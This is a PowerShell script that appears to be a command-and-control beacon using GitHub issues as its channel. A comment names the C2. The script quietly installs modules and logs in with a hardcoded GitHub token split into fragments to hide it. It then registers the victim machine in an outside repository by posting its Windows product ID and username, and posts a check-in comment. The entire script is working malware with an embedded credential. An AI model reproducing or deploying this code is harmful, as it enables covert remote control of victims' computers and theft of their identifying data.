#Use this function to easily write to the console log. Proper usage: Write-Console -Text $textVar
function Write-Console
{
	param([String]$Text)
	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.log"
	$timeStamp = Get-Date -Format G
	try
	{
		Add-Content -Path $consoleLogPath -Value ($timeStamp + ": " + $Text + "`n")
	}
	catch
	{
		#Tell C2 what's in $Error
		Exit
	}
}

#Check if $env:UserProfile\Documents\WindowsPowerShell exists, if not, create it. Use $dirProb to track if we couldn't create the directory.
$path = "$env:USERPROFILE\Documents\WindowsPowerShell"
$dirProb = $false
if (-not ($path | Test-Path))
{
	[System.IO.Directory]::CreateDirectory($path)
	if (-not ($path | Test-Path))
	{
		$dirProb = $true
	}
}

$packs = Get-PackageProvider
If(!($packs.Name -clike 'NuGet'))
{
	Install-PackageProvider -Name NuGet -scope CurrentUser -Force
}
$packs = Get-PackageProvider
If(!($packs.Name -clike 'NuGet'))
{
	echo "ERROR: Unable to install NuGet."
}
ElseIf($packs.Name -clike 'NuGet')
{
	echo "NuGet installed Ok."
}

$mods = Get-InstalledModule
If(!($mods.Name -clike 'PowerShellForGitHub'))
{
	Install-Module -Name PowerShellForGithub -Scope CurrentUser -Force
}
$mods = Get-InstalledModule
If(!($mods.Name -clike 'PowerShellForGitHub'))
{
	echo "ERROR: Unable to install PSFG."
}
ElseIf($mods.Name -clike 'PowerShellForGitHub')
{
	echo "PSFG installed Ok."
}

Import-Module -Name PowerShellForGitHub
Set-GitHubConfiguration -DisableTelemetry -SessionOnly
echo "Telemetry disabled."
$tkn = 'ffbc' + 'f7ac0f2e' + '9b703fcfd17e4f' + 'ab4104269e81ad'
$secure = ConvertTo-SecureString $tkn -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential "USERNAME_IS_IGNORED", $secure
Set-GitHubAuthentication -Credential $cred
$usr = Get-GitHubUser -Current
If(!($usr.login -clike 'BeinnUais1'))
{
	echo "ERROR: Login failed."
}
ElseIf($usr.login -clike 'BeinnUais1')
{
	echo "Login successful."
}

$compInfo = Get-ComputerInfo
$productID = $compInfo.WindowsProductID
echo ("The product ID is " + $productID)
$issueNum = 0

$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
$issueList | ForEach-Object -Process `
{
	If($_.Title -clike $productID)
	{
		echo "Found the issue for this product ID."
		$issueNum = $_.number
	}
}

#Only executes if the $issueNum wasn't set above because the Product ID has no associated issue
If($issueNum -clike "0")
{
	New-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1 -Title $productID -Body $env:USERNAME
	echo ("New issue should have just been created.")
	$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
	$issueList | ForEach-Object -Process `
	{
		If($_.Title -clike $productID)
		{
			echo "Found the issue for this product ID after creating it."
			$issueNum = $_.number
		}
	}
}

echo ("Reached the end with " + $issueNum + " issue number. Attempting to post comment...")

New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body "API POST GOOD"

echo ("Apparently posted.")
Start-Sleep -s 1000
